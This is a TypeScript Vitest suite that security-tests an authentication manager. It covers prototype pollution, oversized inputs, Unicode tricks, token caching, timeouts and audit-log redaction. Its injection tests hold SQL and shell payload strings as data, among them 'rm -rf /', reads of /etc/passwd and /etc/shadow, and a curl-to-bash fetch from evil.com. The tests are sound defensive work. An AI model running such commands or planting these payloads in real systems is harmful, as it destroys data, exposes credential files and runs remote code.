/**
 * Security Tests for AuthenticationManager
 * Comprehensive security edge case testing for authentication
 * @module @omnitron-dev/titan/netron/auth/test
 */

import { describe, expect, it, beforeEach, vi } from 'vitest';
import { AuthenticationManager } from '../../../src/netron/auth/authentication-manager.js';
import type { AuthCredentials, AuthContext } from '../../../src/netron/auth/types.js';

// Mock logger
const createMockLogger = () => ({
  child: vi.fn().mockReturnThis(),
  trace: vi.fn(),
  debug: vi.fn(),
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  fatal: vi.fn(),
});

// Mock audit logger
const createMockAuditLogger = () => ({
  logAuth: vi.fn().mockResolvedValue(undefined),
  logAccess: vi.fn().mockResolvedValue(undefined),
});

describe('AuthenticationManager Security Tests', () => {
  let authManager: AuthenticationManager;
  let mockLogger: ReturnType<typeof createMockLogger>;
  let mockAuditLogger: ReturnType<typeof createMockAuditLogger>;

  beforeEach(() => {
    mockLogger = createMockLogger();
    mockAuditLogger = createMockAuditLogger();
    authManager = new AuthenticationManager(mockLogger as any, undefined, mockAuditLogger as any);
  });

  describe('Credential Security', () => {
    describe('Null/Undefined Credentials Handling', () => {
      it('should safely reject null credentials', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const result = await authManager.authenticate(null as any);
        expect(result.success).toBe(false);
        expect(result.error).toBe('Credentials must be an object');
      });

      it('should safely reject undefined credentials', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const result = await authManager.authenticate(undefined as any);
        expect(result.success).toBe(false);
        expect(result.error).toBe('Credentials must be an object');
      });

      it('should safely reject credentials with null username', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const result = await authManager.authenticate({
          username: null as any,
          password: 'test',
        });
        expect(result.success).toBe(false);
        expect(result.error).toBe('Username must be a string');
      });

      it('should safely reject credentials with undefined password', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        // undefined password is allowed (not validated), should call authenticate
        const _result = await authManager.authenticate({
          username: 'test',
          password: undefined,
        });
        expect(mockAuth).toHaveBeenCalled();
      });
    });

    describe('Prototype Pollution Prevention', () => {
      it('should not be affected by __proto__ in credentials', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        const maliciousCredentials = JSON.parse('{"username":"test","password":"pass","__proto__":{"isAdmin":true}}');
        const result = await authManager.authenticate(maliciousCredentials);

        // Should process normally without prototype pollution
        expect(result.success).toBe(true);
        expect((authManager as any).isAdmin).toBeUndefined();
        expect(({} as any).isAdmin).toBeUndefined();
      });

      it('should not be affected by constructor pollution in credentials', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        const result = await authManager.authenticate({
          username: 'test',
          password: 'pass',
          constructor: { prototype: { polluted: true } } as any,
        });

        expect(result.success).toBe(true);
        expect(({} as any).polluted).toBeUndefined();
      });

      it('should handle nested prototype pollution attempts', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        const result = await authManager.authenticate({
          username: 'test',
          password: 'pass',
          metadata: {
            __proto__: { admin: true },
            nested: { __proto__: { elevated: true } },
          },
        } as any);

        expect(result.success).toBe(true);
      });
    });

    describe('Buffer Overflow / Very Long Input Prevention', () => {
      it('should handle very long username (1MB)', async () => {
        const mockAuth = vi.fn().mockImplementation(async (creds: AuthCredentials) => {
          // Simulate length check
          if (creds.username && creds.username.length > 10000) {
            throw new Error('Username too long');
          }
          return { userId: 'test', roles: [], permissions: [] };
        });
        authManager.configure({ authenticate: mockAuth });

        const longUsername = 'a'.repeat(1024 * 1024); // 1MB
        const result = await authManager.authenticate({
          username: longUsername,
          password: 'test',
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('too long');
      });

      it('should handle very long password (1MB)', async () => {
        const mockAuth = vi.fn().mockImplementation(async (creds: AuthCredentials) => {
          if (creds.password && creds.password.length > 10000) {
            throw new Error('Password too long');
          }
          return { userId: 'test', roles: [], permissions: [] };
        });
        authManager.configure({ authenticate: mockAuth });

        const longPassword = 'b'.repeat(1024 * 1024);
        const result = await authManager.authenticate({
          username: 'test',
          password: longPassword,
        });

        expect(result.success).toBe(false);
      });

      it('should handle extremely long token (10MB) without crash', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockImplementation(async (token: string) => {
            if (token.length > 100000) {
              throw new Error('Token too long');
            }
            return { userId: 'test', roles: [], permissions: [] };
          }),
        });

        const longToken = 'x'.repeat(10 * 1024 * 1024);
        const result = await authManager.validateToken(longToken);

        expect(result.success).toBe(false);
      });

      it('should handle max safe integer character string', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        // Test with reasonably long but not crash-causing input
        const _result = await authManager.authenticate({
          username: 'a'.repeat(65535),
          password: 'b'.repeat(65535),
        });

        expect(mockAuth).toHaveBeenCalled();
      });
    });

    describe('Unicode Normalization Attack Prevention', () => {
      it('should distinguish between NFC and NFD normalized usernames', async () => {
        const receivedUsernames: string[] = [];
        const mockAuth = vi.fn().mockImplementation(async (creds: AuthCredentials) => {
          receivedUsernames.push(creds.username || '');
          return { userId: creds.username, roles: [], permissions: [] };
        });
        authManager.configure({ authenticate: mockAuth });

        // NFC form: single codepoint
        const nfcUsername = '\u00E9'; // e with acute accent (single char)
        // NFD form: base + combining character
        const nfdUsername = 'e\u0301'; // e + combining acute accent

        await authManager.authenticate({ username: nfcUsername, password: 'test' });
        await authManager.authenticate({ username: nfdUsername, password: 'test' });

        // Manager should pass through as-is (validation is up to auth function)
        expect(receivedUsernames).toHaveLength(2);
        expect(receivedUsernames[0]).not.toBe(receivedUsernames[1]);
      });

      it('should handle homograph attack characters (Cyrillic "a" vs Latin "a")', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        // Latin 'admin'
        const latinAdmin = 'admin';
        // Cyrillic lookalike (а is Cyrillic 'a', U+0430)
        const cyrillicAdmin = '\u0430dmin';

        await authManager.authenticate({ username: latinAdmin, password: 'test' });
        await authManager.authenticate({ username: cyrillicAdmin, password: 'test' });

        // Should treat as different usernames
        const calls = mockAuth.mock.calls;
        expect(calls[0][0].username).not.toBe(calls[1][0].username);
      });

      it('should handle zero-width characters in credentials', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        // Username with zero-width joiner
        const usernameWithZWJ = 'admin\u200Duser';
        // Username with zero-width non-joiner
        const usernameWithZWNJ = 'admin\u200Cuser';

        await authManager.authenticate({ username: usernameWithZWJ, password: 'test' });
        await authManager.authenticate({ username: usernameWithZWNJ, password: 'test' });

        // Both should be passed through (auth function decides)
        expect(mockAuth).toHaveBeenCalledTimes(2);
      });

      it('should handle right-to-left override characters', async () => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        // Username with RTL override that could make "admin" appear as something else
        const rtlUsername = '\u202Eadmin'; // Right-to-left override

        const result = await authManager.authenticate({ username: rtlUsername, password: 'test' });
        expect(result.success).toBe(true);
        expect(mockAuth).toHaveBeenCalledWith(expect.objectContaining({ username: rtlUsername }));
      });
    });

    describe('SQL Injection Payload Handling', () => {
      const sqlInjectionPayloads = [
        "admin' OR '1'='1",
        "admin'--",
        "admin' OR 1=1--",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users--",
        "admin'; EXEC xp_cmdshell('dir')--",
        "1; UPDATE users SET password='hacked'",
        "admin' AND SUBSTRING(password,1,1)='a",
        "admin'/**/OR/**/1=1",
        "admin' WAITFOR DELAY '0:0:10'--",
      ];

      it.each(sqlInjectionPayloads)(
        'should safely pass SQL injection payload "%s" to auth function',
        async (payload) => {
          const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
          authManager.configure({ authenticate: mockAuth });

          const result = await authManager.authenticate({
            username: payload,
            password: 'test',
          });

          expect(result.success).toBe(true);
          expect(mockAuth).toHaveBeenCalledWith(expect.objectContaining({ username: payload }));
          // Manager passes through - validation is auth function's responsibility
        }
      );

      it('should not modify SQL injection payloads during processing', async () => {
        let receivedCredentials: AuthCredentials | null = null;
        const mockAuth = vi.fn().mockImplementation(async (creds: AuthCredentials) => {
          receivedCredentials = creds;
          return { userId: 'test', roles: [], permissions: [] };
        });
        authManager.configure({ authenticate: mockAuth });

        const payload = "admin'; DELETE FROM users WHERE '1'='1";
        await authManager.authenticate({ username: payload, password: payload });

        expect(receivedCredentials?.username).toBe(payload);
        expect(receivedCredentials?.password).toBe(payload);
      });
    });

    describe('Command Injection Payload Handling', () => {
      const commandInjectionPayloads = [
        'admin; rm -rf /',
        'admin | cat /etc/passwd',
        'admin`cat /etc/passwd`',
        'admin$(whoami)',
        'admin && echo hacked',
        'admin || true',
        'admin > /tmp/evil',
        'admin < /dev/zero',
        '$(curl http://evil.com/shell.sh | bash)',
        'admin\ncat /etc/shadow',
      ];

      it.each(commandInjectionPayloads)('should safely handle command injection payload "%s"', async (payload) => {
        const mockAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: mockAuth });

        const result = await authManager.authenticate({
          username: payload,
          password: 'test',
        });

        // Should process without actually executing commands
        expect(result.success).toBe(true);
      });
    });
  });

  describe('Token Validation Security', () => {
    describe('Token with Null Bytes', () => {
      it('should handle token with embedded null bytes', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const tokenWithNull = 'valid-token\x00malicious-part';
        const result = await authManager.validateToken(tokenWithNull);

        // Should process the full token including null byte
        expect(result.success).toBe(true);
      });

      it('should not truncate token at null byte', async () => {
        let receivedToken: string | null = null;
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockImplementation(async (token: string) => {
            receivedToken = token;
            return { userId: 'test', roles: [], permissions: [] };
          }),
        });

        const tokenWithNull = 'part1\x00part2';
        await authManager.validateToken(tokenWithNull);

        expect(receivedToken).toBe(tokenWithNull);
        expect(receivedToken?.length).toBe('part1\x00part2'.length);
      });
    });

    describe('Token with Control Characters', () => {
      it('should handle tokens with carriage return and newline', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const tokenWithCRLF = 'token\r\nX-Injected-Header: evil';
        const result = await authManager.validateToken(tokenWithCRLF);

        expect(result.success).toBe(true);
      });

      it('should handle tokens with tab characters', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const tokenWithTab = 'token\tpart2';
        const result = await authManager.validateToken(tokenWithTab);

        expect(result.success).toBe(true);
      });

      it('should handle tokens with bell character and other ASCII control chars', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const tokenWithBell = 'token\x07bell';
        const tokenWithBackspace = 'token\x08backspace';
        const tokenWithEscape = 'token\x1Bescape';

        await expect(authManager.validateToken(tokenWithBell)).resolves.toMatchObject({ success: true });
        await expect(authManager.validateToken(tokenWithBackspace)).resolves.toMatchObject({ success: true });
        await expect(authManager.validateToken(tokenWithEscape)).resolves.toMatchObject({ success: true });
      });
    });

    describe('Token Timing Attack Resistance', () => {
      it('should use constant-time hashing for token cache lookup', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000 },
        });

        // Populate cache with a token
        const cachedToken = 'cached-token-abc123';
        await authManager.validateToken(cachedToken);

        // Measure timing for cache hit
        const cacheHitTimes: number[] = [];
        for (let i = 0; i < 100; i++) {
          const start = performance.now();
          await authManager.validateToken(cachedToken);
          cacheHitTimes.push(performance.now() - start);
        }

        // Measure timing for cache miss
        const cacheMissTimes: number[] = [];
        for (let i = 0; i < 100; i++) {
          const start = performance.now();
          await authManager.validateToken(`different-token-${i}`);
          cacheMissTimes.push(performance.now() - start);
        }

        const avgHit = cacheHitTimes.reduce((a, b) => a + b, 0) / cacheHitTimes.length;
        const avgMiss = cacheMissTimes.reduce((a, b) => a + b, 0) / cacheMissTimes.length;

        // Cache hits should be faster (this is expected)
        // But the hash computation should be constant-time
        // Note: This test validates the mechanism exists, not perfect constant-time
        expect(avgHit).toBeLessThan(avgMiss);
      });

      it('should hash tokens before caching (not store raw tokens)', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000 },
        });

        const sensitiveToken = 'super-secret-token-12345';
        await authManager.validateToken(sensitiveToken);

        // Access internal cache (testing implementation detail)
        const cache = (authManager as any).tokenCache;
        expect(cache).toBeDefined();

        // The raw token should NOT be a key in the cache
        // Instead, it should be hashed
        // TimedMap uses entries() iterator, not keys()
        const keys: string[] = [];
        for (const [key] of cache.entries()) {
          keys.push(key);
        }
        expect(keys).not.toContain(sensitiveToken);
        // Should be a hash (64 hex chars for SHA-256)
        expect(keys.every((k: string) => /^[a-f0-9]{64}$/.test(k))).toBe(true);
      });
    });

    describe('Token Replay Detection', () => {
      it('should allow multiple uses of same token within TTL (expected session behavior)', async () => {
        const validateFn = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: validateFn,
          tokenCache: { enabled: true, ttl: 60000 },
        });

        const token = 'session-token';

        // First use
        const result1 = await authManager.validateToken(token);
        expect(result1.success).toBe(true);

        // Second use (replay) - should succeed from cache
        const result2 = await authManager.validateToken(token);
        expect(result2.success).toBe(true);

        // Third use
        const result3 = await authManager.validateToken(token);
        expect(result3.success).toBe(true);

        // Validator should only be called once (cached)
        expect(validateFn).toHaveBeenCalledTimes(1);
      });

      it('should re-validate token after cache expiry', async () => {
        const validateFn = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: validateFn,
          tokenCache: { enabled: true, ttl: 100 }, // Very short TTL
        });

        const token = 'expiring-token';

        await authManager.validateToken(token);
        expect(validateFn).toHaveBeenCalledTimes(1);

        // Wait for cache to expire
        await new Promise((resolve) => setTimeout(resolve, 150));

        await authManager.validateToken(token);
        expect(validateFn).toHaveBeenCalledTimes(2);
      });
    });

    describe('Token Blacklisting', () => {
      it('should support invalidating cached tokens via clearCache', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000 },
        });

        const token = 'to-be-invalidated';
        await authManager.validateToken(token);

        const statsBefore = authManager.getCacheStats();
        expect(statsBefore.size).toBe(1);

        // Simulate token blacklisting by clearing cache
        authManager.clearCache();

        const statsAfter = authManager.getCacheStats();
        expect(statsAfter.size).toBe(0);
      });
    });
  });

  describe('Cache Security', () => {
    describe('Cache Poisoning Prevention', () => {
      it('should not cache failed validation results', async () => {
        const validateFn = vi
          .fn()
          .mockRejectedValueOnce(new Error('Invalid token'))
          .mockResolvedValueOnce({ userId: 'test', roles: [], permissions: [] });

        authManager.configure({
          authenticate: vi.fn(),
          validateToken: validateFn,
          tokenCache: { enabled: true, ttl: 60000 },
        });

        const token = 'retry-token';

        // First attempt fails
        const result1 = await authManager.validateToken(token);
        expect(result1.success).toBe(false);

        // Second attempt should retry (not use cached failure)
        const result2 = await authManager.validateToken(token);
        expect(result2.success).toBe(true);

        // Should have called validator twice
        expect(validateFn).toHaveBeenCalledTimes(2);
      });

      it('should not allow cache key collision through hash manipulation', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockImplementation(async (token: string) => ({
            userId: `user-${token.substring(0, 10)}`,
            roles: [],
            permissions: [],
          })),
          tokenCache: { enabled: true, ttl: 60000 },
        });

        // Generate many tokens to check for hash collisions
        const tokens = Array.from({ length: 100 }, (_, i) => `token-${i}-${Math.random()}`);

        const results = await Promise.all(tokens.map((t) => authManager.validateToken(t)));

        // All should succeed with unique user IDs
        const userIds = results.map((r) => r.context?.userId);
        const uniqueUserIds = new Set(userIds);
        expect(uniqueUserIds.size).toBe(100);
      });
    });

    describe('Cache Timing Attack Prevention', () => {
      it('should use consistent hashing for all tokens regardless of content', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000 },
        });

        const shortToken = 'abc';
        const longToken = 'a'.repeat(10000);

        // Measure hash time for short token
        const shortTimes: number[] = [];
        for (let i = 0; i < 50; i++) {
          const start = performance.now();
          await authManager.validateToken(shortToken + i);
          shortTimes.push(performance.now() - start);
        }

        // Measure hash time for long token
        const longTimes: number[] = [];
        for (let i = 0; i < 50; i++) {
          const start = performance.now();
          await authManager.validateToken(longToken + i);
          longTimes.push(performance.now() - start);
        }

        const avgShort = shortTimes.reduce((a, b) => a + b, 0) / shortTimes.length;
        const avgLong = longTimes.reduce((a, b) => a + b, 0) / longTimes.length;

        // Long tokens will take slightly longer to hash, but not proportionally
        // This checks that we're using a proper hash, not character-by-character comparison
        const ratio = avgLong / avgShort;
        expect(ratio).toBeLessThan(100); // Should not be 10000x slower for 10000x longer input
      });
    });

    describe('Cache Size Limits (DoS Prevention)', () => {
      it('should enforce maximum cache size', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000, maxSize: 10 },
        });

        // Try to add more than max size
        for (let i = 0; i < 20; i++) {
          await authManager.validateToken(`token-${i}`);
        }

        const stats = authManager.getCacheStats();
        expect(stats.size).toBeLessThanOrEqual(10);
      });

      it('should warn when cache reaches max capacity', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000, maxSize: 5 },
        });

        // Fill cache to capacity
        for (let i = 0; i < 10; i++) {
          await authManager.validateToken(`token-${i}`);
        }

        // Should have logged warning about max capacity
        expect(mockLogger.warn).toHaveBeenCalledWith(
          expect.objectContaining({ maxSize: 5 }),
          expect.stringContaining('max capacity')
        );
      });

      it('should not crash with very high cache traffic', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
          tokenCache: { enabled: true, ttl: 60000, maxSize: 100 },
        });

        // High volume of unique tokens
        const promises = Array.from({ length: 10000 }, (_, i) => authManager.validateToken(`high-volume-token-${i}`));

        await expect(Promise.all(promises)).resolves.toBeDefined();
      });
    });
  });

  describe('Timeout Security', () => {
    describe('Timeout Bypass Prevention', () => {
      it('should enforce timeout even if auth function ignores it', async () => {
        vi.useFakeTimers();

        // Auth function that never resolves
        const hangingAuth = vi.fn().mockImplementation(() => new Promise(() => {}));
        authManager.configure({ authenticate: hangingAuth });
        authManager.setTimeout(1000);

        const resultPromise = authManager.authenticate({
          username: 'test',
          password: 'test',
        });

        vi.advanceTimersByTime(1000);

        const result = await resultPromise;
        expect(result.success).toBe(false);
        expect(result.error).toContain('timed out');

        vi.useRealTimers();
      });

      it('should enforce timeout on token validation', async () => {
        vi.useFakeTimers();

        const hangingValidate = vi.fn().mockImplementation(() => new Promise(() => {}));
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: hangingValidate,
        });
        authManager.setTimeout(500);

        const resultPromise = authManager.validateToken('some-token');

        vi.advanceTimersByTime(500);

        const result = await resultPromise;
        expect(result.success).toBe(false);
        expect(result.error).toContain('timed out');

        vi.useRealTimers();
      });
    });

    describe('Very Small Timeout Handling', () => {
      it('should handle 1ms timeout gracefully', async () => {
        const quickAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: quickAuth });
        authManager.setTimeout(1);

        // May or may not succeed depending on timing
        const result = await authManager.authenticate({
          username: 'test',
          password: 'test',
        });

        // Should either succeed or timeout - not throw
        expect(result).toHaveProperty('success');
      });
    });

    describe('Zero/Negative Timeout Handling', () => {
      it('should reject zero timeout', () => {
        expect(() => authManager.setTimeout(0)).toThrow(RangeError);
      });

      it('should reject negative timeout', () => {
        expect(() => authManager.setTimeout(-1000)).toThrow(RangeError);
        expect(() => authManager.setTimeout(-1)).toThrow(RangeError);
      });

      it('should reject Number.NEGATIVE_INFINITY timeout', () => {
        expect(() => authManager.setTimeout(Number.NEGATIVE_INFINITY)).toThrow(RangeError);
      });
    });

    describe('Timeout Race Condition Prevention', () => {
      it('should clear timeout when auth completes before timeout', async () => {
        const quickAuth = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
        authManager.configure({ authenticate: quickAuth });
        authManager.setTimeout(10000);

        const result = await authManager.authenticate({
          username: 'test',
          password: 'test',
        });

        expect(result.success).toBe(true);
        // Timeout should have been cleared - no lingering timers
      });

      it('should handle concurrent auth requests with different timeouts', async () => {
        const slowAuth = vi.fn().mockImplementation(async () => {
          await new Promise((resolve) => setTimeout(resolve, 50));
          return { userId: 'test', roles: [], permissions: [] };
        });
        authManager.configure({ authenticate: slowAuth });
        authManager.setTimeout(200);

        const results = await Promise.all([
          authManager.authenticate({ username: 'user1', password: 'pass' }),
          authManager.authenticate({ username: 'user2', password: 'pass' }),
          authManager.authenticate({ username: 'user3', password: 'pass' }),
        ]);

        expect(results.every((r) => r.success)).toBe(true);
      });
    });
  });

  describe('Audit Security', () => {
    describe('PII Redaction in Logs', () => {
      it('should not log password in audit events', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        await authManager.authenticate({
          username: 'testuser',
          password: 'super-secret-password',
        });

        // Check audit logger calls
        const auditCalls = mockAuditLogger.logAuth.mock.calls;
        expect(auditCalls.length).toBeGreaterThan(0);

        // Password should not appear in any audit event
        const auditJson = JSON.stringify(auditCalls);
        expect(auditJson).not.toContain('super-secret-password');
      });

      it('should not log token in error messages', async () => {
        authManager.configure({
          authenticate: vi.fn(),
          validateToken: vi.fn().mockRejectedValue(new Error('Token invalid')),
        });

        const sensitiveToken = 'jwt-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';
        await authManager.validateToken(sensitiveToken);

        // Check that token doesn't appear in error logs
        const errorCalls = mockLogger.error.mock.calls;
        const errorJson = JSON.stringify(errorCalls);
        expect(errorJson).not.toContain(sensitiveToken);
      });

      it('should only log username (not password) in args', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        await authManager.authenticate({
          username: 'testuser',
          password: 'secret123',
        });

        const auditCalls = mockAuditLogger.logAuth.mock.calls;
        if (auditCalls.length > 0) {
          const auditEvent = auditCalls[0][0];
          if (auditEvent.args) {
            const argsJson = JSON.stringify(auditEvent.args);
            expect(argsJson).toContain('testuser');
            expect(argsJson).not.toContain('secret123');
          }
        }
      });
    });

    describe('Log Injection Prevention', () => {
      it('should safely handle newlines in credentials that could split log entries', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const maliciousUsername = 'admin\nFAKE LOG: Admin login successful';
        await authManager.authenticate({
          username: maliciousUsername,
          password: 'test',
        });

        // Should handle without creating fake log entries
        // Actual prevention depends on log transport formatting
        expect(mockAuditLogger.logAuth).toHaveBeenCalled();
      });

      it('should safely handle ANSI escape sequences in credentials', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        const ansiUsername = 'admin\x1B[31mRED TEXT\x1B[0m';
        await authManager.authenticate({
          username: ansiUsername,
          password: 'test',
        });

        expect(mockAuditLogger.logAuth).toHaveBeenCalled();
      });
    });

    describe('Audit Data Integrity', () => {
      it('should include timestamp in all audit events', async () => {
        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        await authManager.authenticate({ username: 'test', password: 'test' });

        const auditCalls = mockAuditLogger.logAuth.mock.calls;
        expect(auditCalls.length).toBeGreaterThan(0);
        expect(auditCalls[0][0]).toHaveProperty('timestamp');
        expect(auditCalls[0][0].timestamp).toBeInstanceOf(Date);
      });

      it('should include success/failure status in all audit events', async () => {
        authManager.configure({
          authenticate: vi
            .fn()
            .mockResolvedValueOnce({ userId: 'test', roles: [], permissions: [] })
            .mockRejectedValueOnce(new Error('Auth failed')),
        });

        await authManager.authenticate({ username: 'user1', password: 'pass' });
        await authManager.authenticate({ username: 'user2', password: 'pass' });

        const auditCalls = mockAuditLogger.logAuth.mock.calls;
        expect(auditCalls.length).toBe(2);
        expect(auditCalls[0][0].success).toBe(true);
        expect(auditCalls[1][0].success).toBe(false);
      });

      it('should include duration metadata for performance monitoring', async () => {
        authManager.configure({
          authenticate: vi.fn().mockImplementation(async () => {
            await new Promise((resolve) => setTimeout(resolve, 50));
            return { userId: 'test', roles: [], permissions: [] };
          }),
        });

        await authManager.authenticate({ username: 'test', password: 'test' });

        const auditCalls = mockAuditLogger.logAuth.mock.calls;
        expect(auditCalls[0][0].metadata).toHaveProperty('duration');
        expect(auditCalls[0][0].metadata.duration).toBeGreaterThanOrEqual(50);
      });

      it('should handle audit logger failure without affecting authentication', async () => {
        mockAuditLogger.logAuth.mockRejectedValue(new Error('Audit service unavailable'));

        authManager.configure({
          authenticate: vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] }),
        });

        // Should succeed even if audit fails
        const result = await authManager.authenticate({ username: 'test', password: 'test' });
        expect(result.success).toBe(true);

        // Wait for async audit error handling
        await new Promise((resolve) => setTimeout(resolve, 10));

        // Should log the audit failure
        expect(mockLogger.error).toHaveBeenCalledWith(
          expect.objectContaining({ method: 'authenticate' }),
          'Audit log failed'
        );
      });
    });
  });

  describe('Concurrent Security Scenarios', () => {
    it('should handle concurrent authentication attempts safely', async () => {
      const authContext: AuthContext = { userId: 'test', roles: ['user'], permissions: [] };
      let callCount = 0;

      authManager.configure({
        authenticate: vi.fn().mockImplementation(async () => {
          callCount++;
          await new Promise((resolve) => setTimeout(resolve, Math.random() * 10));
          return authContext;
        }),
      });

      const promises = Array.from({ length: 100 }, () =>
        authManager.authenticate({ username: 'test', password: 'test' })
      );

      const results = await Promise.all(promises);

      expect(results.every((r) => r.success)).toBe(true);
      expect(callCount).toBe(100);
    });

    it('should handle concurrent token validation with cache safely', async () => {
      const validateFn = vi.fn().mockResolvedValue({ userId: 'test', roles: [], permissions: [] });
      authManager.configure({
        authenticate: vi.fn(),
        validateToken: validateFn,
        tokenCache: { enabled: true, ttl: 60000 },
      });

      // First validation populates the cache
      await authManager.validateToken('shared-token');
      expect(validateFn).toHaveBeenCalledTimes(1);

      // Now concurrent validations of same token should hit cache
      const promises = Array.from({ length: 100 }, () => authManager.validateToken('shared-token'));

      const results = await Promise.all(promises);

      expect(results.every((r) => r.success)).toBe(true);
      // Cache should work - validator should NOT be called again (all cache hits)
      expect(validateFn).toHaveBeenCalledTimes(1);
      const stats = authManager.getCacheStats();
      expect(stats.hits).toBeGreaterThan(0);
    });

    it('should handle mixed success and failure concurrently', async () => {
      let counter = 0;
      authManager.configure({
        authenticate: vi.fn().mockImplementation(async (creds: AuthCredentials) => {
          counter++;
          if (counter % 2 === 0) {
            throw new Error('Simulated failure');
          }
          return { userId: creds.username!, roles: [], permissions: [] };
        }),
      });

      const promises = Array.from({ length: 50 }, (_, i) =>
        authManager.authenticate({ username: `user${i}`, password: 'test' })
      );

      const results = await Promise.all(promises);

      const successes = results.filter((r) => r.success).length;
      const failures = results.filter((r) => !r.success).length;

      expect(successes).toBeGreaterThan(0);
      expect(failures).toBeGreaterThan(0);
    });
  });
});
